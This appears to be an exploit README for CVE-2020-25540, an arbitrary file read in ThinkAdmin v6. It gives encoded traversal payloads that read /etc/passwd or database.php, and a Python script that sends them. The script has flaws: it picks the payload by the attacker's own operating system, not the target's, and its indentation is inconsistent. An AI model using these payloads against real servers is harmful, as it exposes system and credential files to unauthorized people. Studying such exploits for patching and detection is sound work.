## CVE-2020-25540

ThinkAdmin 6 -  Arbitrarily File Read

**Vendor:** https://github.com/zoujingli/ThinkAdmin/

**Version:** v6 <= 2020.08.03.01

## Payload:
- On Linux read `/etc/passwd`:
  - `34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s`
- On Windows read `database.php`:
  - `34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34`

**Source [_exploit.py_](https://github.com/melissa-max/Exploits/blob/master/CVE-2020-25540/exploit.py):**
```python
from sys import platform
import requests

# ThinkAdmin default port is 8000
base_url = "http://127.0.0.1:8000"

print("\n<= ThinkAdmin 6 -  Arbitrarily File Read || CVE-2020-25540 =>\n")
print("\n[~] STARTING EXPLOIT...\n")

"""
Payload Description:
	On Linux read `/etc/passwd`:
		34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s
	On Windows read `database.php`:
		34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34
"""
if platform == "linux" or platform == "linux2":
	payload = "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s"
    exploit_req = requests.get(base_url+payload)
elif platform == "win32":
	payload = "/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34"
    exploit_req = requests.get(base_url+payload)

print("\n[~] RESPONSE:\n{}\n".format(exploit_req.content))
```
